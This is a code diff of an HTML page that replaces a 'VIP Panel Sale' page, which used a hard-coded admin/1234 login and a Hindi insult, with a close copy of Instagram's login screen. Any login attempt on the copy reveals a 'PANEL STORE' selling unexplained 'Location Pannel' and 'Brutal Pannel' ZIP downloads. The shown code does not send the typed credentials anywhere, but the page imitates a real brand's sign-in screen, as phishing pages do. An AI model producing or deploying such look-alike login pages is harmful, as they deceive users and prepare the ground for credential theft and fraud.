@@ -1,183 +1,446 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VIP Panel Sale</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
-  body {
-    background: linear-gradient(135deg, #1a1a2e, #16213e);
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: white;
-  }
-  .popup {
-    background: #0f3460;
-    padding: 30px;
-    border-radius: 15px;
-    width: 90%;
-    max-width: 400px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    text-align: center;
-  }
-  .popup h2 {
-    margin-bottom: 20px;
-    color: #e94560;
-  }
-  input {
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    border: none;
-    border-radius: 8px;
-    background: #1a1a2e;
-    color: white;
-    font-size: 16px;
-  }
-  button {
-    width: 100%;
-    padding: 12px;
-    margin-top: 15px;
-    border: none;
-    border-radius: 8px;
-    background: #e94560;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.3s;
-  }
-  button:hover { background: #ff6b6b; }
-  .error {
-    color: #ff6b6b;
-    margin-top: 10px;
-    font-size: 14px;
-  }
-  .sale-title {
-    font-size: 28px;
-    font-weight: bold;
-    color: #e94560;
-    animation: blink 1s infinite;
-    margin-bottom: 10px;
-  }
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.5; }
-  }
-  .option {
-    background: #1a1a2e;
-    padding: 15px;
-    margin: 12px 0;
-    border-radius: 10px;
-    cursor: pointer;
-    border: 2px solid transparent;
-    transition: 0.3s;
-  }
-  .option:hover {
-    border-color: #e94560;
-    transform: scale(1.02);
-  }
-  .option h3 {
-    margin-bottom: 5px;
-  }
-  .price {
-    color: #00ff88;
-    font-size: 18px;
-    font-weight: bold;
-  }
-  .payment-options {
-    display: none;
-    margin-top: 20px;
-  }
-  .pay-btn {
-    background: #00b894;
-    margin: 8px 0;
-  }
-  .pay-btn:hover { background: #00cec9; }
-  .hidden { display: none; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            max-width: 935px;
+            width: 100%;
+            justify-content: center;
+            align-items: center;
+            gap: 32px;
+        }
+
+        .phone-preview {
+            display: none;
+        }
+
+        @media (min-width: 876px) {
+            .phone-preview {
+                display: block;
+                width: 380px;
+                height: 580px;
+                background: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/Itwecx42N91.png') no-repeat center;
+                background-size: contain;
+            }
+        }
+
+        .login-box {
+            width: 350px;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            height: 51px;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .forgot {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            width: 350px;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+        }
+
+        /* Sales Page Styles */
+        .sales-page {
+            display: none;
+            background: #0f0f0f;
+            min-height: 100vh;
+            color: #fff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        .sales-header {
+            background: linear-gradient(90deg, #111, #1a1a1a);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #222;
+        }
+
+        .sales-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #00f5a0, #00d9f5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .sales-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 60px 20px;
+        }
+
+        .sales-title {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .sales-title h2 {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
+        .sales-title p {
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .product-card {
+            background: #161616;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .product-card:hover {
+            transform: translateY(-8px);
+            border-color: #00f5a0;
+            box-shadow: 0 20px 40px rgba(0, 245, 160, 0.15);
+        }
+
+        .product-badge {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: #00f5a0;
+            color: #000;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+        }
+
+        .product-image {
+            height: 180px;
+            background: linear-gradient(135deg, #1a1a1a, #0d0d0d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .product-body {
+            padding: 24px;
+        }
+
+        .product-body h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .product-body p {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .price {
+            font-size: 28px;
+            font-weight: 800;
+            color: #00f5a0;
+            margin-bottom: 20px;
+        }
+
+        .price span {
+            font-size: 14px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .download-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(90deg, #00f5a0, #00d9f5);
+            color: #000;
+            text-align: center;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 15px;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .download-btn:hover {
+            opacity: 0.9;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 60px;
+            color: #555;
+            font-size: 13px;
+        }
+    </style>
 </head>
 <body>
 
-  <!-- Login Popup -->
-  <div id="loginPopup" class="popup">
-    <h2>Login Required</h2>
-    <input type="text" id="loginId" placeholder="Login ID">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="checkLogin()">Login</button>
-    <p id="errorMsg" class="error"></p>
-  </div>
+    <!-- LOGIN PAGE -->
+    <div id="loginPage" class="container">
+        <div class="phone-preview"></div>
 
-  <!-- Sale Popup -->
-  <div id="salePopup" class="popup hidden">
-    <div class="sale-title">SALE SALE SALE</div>
-    <h2>VIP Panel</h2>
-    <p style="margin-bottom: 20px;">Add Sale</p>
+        <div>
+            <div class="login-box">
+                <div class="logo">
+                    <svg aria-label="Instagram" height="51" role="img" viewBox="0 0 175 51" width="175">
+                        <path d="M26.4 25.2c0 6.3-5.1 11.4-11.4 11.4S3.6 31.5 3.6 25.2 8.7 13.8 15 13.8s11.4 5.1 11.4 11.4zm-4.2 0c0-4-3.2-7.2-7.2-7.2s-7.2 3.2-7.2 7.2 3.2 7.2 7.2 7.2 7.2-3.2 7.2-7.2z" fill="#262626"/>
+                        <path d="M15 3.6c6.3 0 11.4 5.1 11.4 11.4S21.3 26.4 15 26.4 3.6 21.3 3.6 15 8.7 3.6 15 3.6zm0 4.2c-4 0-7.2 3.2-7.2 7.2s3.2 7.2 7.2 7.2 7.2-3.2 7.2-7.2-3.2-7.2-7.2-7.2z" fill="#262626"/>
+                        <circle cx="37.8" cy="13.2" r="2.4" fill="#262626"/>
+                        <path d="M50.4 25.2c0 6.3-5.1 11.4-11.4 11.4S27.6 31.5 27.6 25.2 32.7 13.8 39 13.8s11.4 5.1 11.4 11.4zm-4.2 0c0-4-3.2-7.2-7.2-7.2s-7.2 3.2-7.2 7.2 3.2 7.2 7.2 7.2 7.2-3.2 7.2-7.2z" fill="#262626"/>
+                        <path d="M75.6 36.6V15h4.2v1.8c1.2-1.5 3-2.4 5.1-2.4 3.9 0 6.9 3.3 6.9 7.5v15.3h-4.2V22.5c0-2.1-1.5-3.6-3.6-3.6s-3.6 1.5-3.6 3.6v14.1h-4.8z" fill="#262626"/>
+                        <path d="M99 36.6c-4.2 0-7.5-3.3-7.5-7.5s3.3-7.5 7.5-7.5 7.5 3.3 7.5 7.5-3.3 7.5-7.5 7.5zm0-11.1c-2 0-3.6 1.5-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.5 3.6-3.6-1.6-3.6-3.6-3.6z" fill="#262626"/>
+                        <path d="M117.6 36.6c-4.2 0-7.5-3.3-7.5-7.5s3.3-7.5 7.5-7.5 7.5 3.3 7.5 7.5-3.3 7.5-7.5 7.5zm0-11.1c-2 0-3.6 1.5-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.5 3.6-3.6-1.6-3.6-3.6-3.6z" fill="#262626"/>
+                        <path d="M136.2 36.6c-4.2 0-7.5-3.3-7.5-7.5s3.3-7.5 7.5-7.5 7.5 3.3 7.5 7.5-3.3 7.5-7.5 7.5zm0-11.1c-2 0-3.6 1.5-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.5 3.6-3.6-1.6-3.6-3.6-3.6z" fill="#262626"/>
+                        <path d="M154.8 36.6V15h4.2v21.6h-4.2z" fill="#262626"/>
+                        <path d="M171.6 36.6c-4.2 0-7.5-3.3-7.5-7.5s3.3-7.5 7.5-7.5c2.1 0 3.9.9 5.1 2.4V15h4.2v21.6h-4.2v-1.8c-1.2 1.5-3 2.4-5.1 2.4zm0-11.1c-2 0-3.6 1.5-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.5 3.6-3.6-1.6-3.6-3.6-3.6z" fill="#262626"/>
+                    </svg>
+                </div>
 
-    <div class="option" onclick="showPayment(399)">
-      <h3>VIP Panel</h3>
-      <div class="price">₹399</div>
+                <form onsubmit="handleLogin(event)">
+                    <div class="form-group">
+                        <input type="text" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-btn">Log in</button>
+                </form>
+
+                <div class="divider"><span>OR</span></div>
+
+                <a href="#" class="facebook-login">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
+                        <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6H4.7V8h2.1V6.2c0-2.1 1.2-3.2 3.1-3.2.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.2V8h2.2l-.4 2.3H9.4v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8z"/>
+                    </svg>
+                    Log in with Facebook
+                </a>
+
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+
+            <div class="get-app">
+                Get the app.
+                <div class="app-buttons">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="option" onclick="showPayment(599)">
-      <h3>VIP Location Panel</h3>
-      <div class="price">₹599</div>
+    <!-- SALES PAGE -->
+    <div id="salesPage" class="sales-page">
+        <div class="sales-header">
+            <h1>PANEL STORE</h1>
+            <div style="color:#888;font-size:14px;">Premium Digital Panels</div>
+        </div>
+
+        <div class="sales-container">
+            <div class="sales-title">
+                <h2>Exclusive Panel Collection</h2>
+                <p>High-quality digital panels — instant zip download after purchase</p>
+            </div>
+
+            <div class="products">
+                <!-- Product 1 -->
+                <div class="product-card">
+                    <div class="product-badge">SALE</div>
+                    <div class="product-image">📦</div>
+                    <div class="product-body">
+                        <h3>Pannel at Sale</h3>
+                        <p>Premium panel package with ready-to-use files. Instant access.</p>
+                        <div class="price">₹299 <span>/ one-time</span></div>
+                        <a href="pannel-at-sale-299.zip" class="download-btn" download>Download ZIP — ₹299</a>
+                    </div>
+                </div>
+
+                <!-- Product 2 -->
+                <div class="product-card">
+                    <div class="product-badge">HOT</div>
+                    <div class="product-image">📍</div>
+                    <div class="product-body">
+                        <h3>Location Pannel</h3>
+                        <p>Location-based panel with advanced features and tools.</p>
+                        <div class="price">₹499 <span>/ one-time</span></div>
+                        <a href="location-pannel-499.zip" class="download-btn" download>Download ZIP — ₹499</a>
+                    </div>
+                </div>
+
+                <!-- Product 3 -->
+                <div class="product-card">
+                    <div class="product-badge">PRO</div>
+                    <div class="product-image">🔥</div>
+                    <div class="product-body">
+                        <h3>Brutal Pannel</h3>
+                        <p>Ultimate brutal panel — full power pack with exclusive tools.</p>
+                        <div class="price">₹999 <span>/ one-time</span></div>
+                        <a href="brutal-pannel-999.zip" class="download-btn" download>Download ZIP — ₹999</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-note">
+                All panels are delivered as ZIP files. After clicking download, the file will start downloading immediately.<br>
+                Support available 24/7 • Secure & Instant Delivery
+            </div>
+        </div>
     </div>
 
-    <div class="option" onclick="showPayment(799)">
-      <h3>Brutal Panel Sale</h3>
-      <div class="price">₹799</div>
-    </div>
-
-    <div id="paymentBox" class="payment-options">
-      <h3 style="margin-bottom: 15px;">Choose Payment Method</h3>
-      <button class="pay-btn" onclick="payNow('Google Pay')">Google Pay</button>
-      <button class="pay-btn" onclick="payNow('PhonePe')">PhonePe</button>
-      <button class="pay-btn" onclick="payNow('UPI / Other')">UPI / Other</button>
-    </div>
-  </div>
-
-<script>
-  // सही ID और Password यहाँ सेट करें
-  const correctID = "admin";
-  const correctPass = "1234";
-  let attempts = 0;
-
-  function checkLogin() {
-    const id = document.getElementById("loginId").value.trim();
-    const pass = document.getElementById("password").value.trim();
-    const errorMsg = document.getElementById("errorMsg");
-
-    if (attempts >= 3) {
-      errorMsg.innerText = "ABBE LAUDDE PASS LEKE AA";
-      return;
-    }
-
-    if (id === correctID && pass === correctPass) {
-      document.getElementById("loginPopup").classList.add("hidden");
-      document.getElementById("salePopup").classList.remove("hidden");
-    } else {
-      attempts++;
-      if (attempts >= 3) {
-        errorMsg.innerText = "Please try again later";
-      } else {
-        errorMsg.innerText = "Incorrect password";
-      }
-    }
-  }
-
-  function showPayment(price) {
-    document.getElementById("paymentBox").style.display = "block";
-    // selected price store कर सकते हो अगर जरूरत हो
-    window.selectedPrice = price;
-  }
-
-  function payNow(method) {
-    alert("Payment method selected: " + method + "\nAmount: ₹" + window.selectedPrice + "\n\n(यह demo है। असली payment integration बाद में जोड़ सकते हो)");
-  }
-</script>
-
+    <script>
+        function handleLogin(e) {
+            e.preventDefault();
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('salesPage').style.display = 'block';
+            document.body.style.background = '#0f0f0f';
+        }
+    </script>
 </body>
 </html>
